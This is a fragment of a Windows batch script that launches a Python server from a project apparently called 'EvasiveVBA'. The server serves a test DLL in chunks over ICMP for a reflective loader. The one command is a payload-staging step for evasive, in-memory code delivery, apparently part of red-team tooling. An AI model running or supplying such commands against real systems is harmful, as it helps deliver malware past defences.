...
echo.
"C:\Users\itag7\AppData\Local\Programs\Python\Python314\python.exe" "C:\Users\itag7\ll_projects\EvasiveVBA\src\payloads\ReflectiveLoader_ICMP\server.py" "C:\Users\itag7\ll_projects\EvasiveVBA\test\test_dll_x64.dll" --chunk-size 1024 --bind 192.168.1.212
echo.
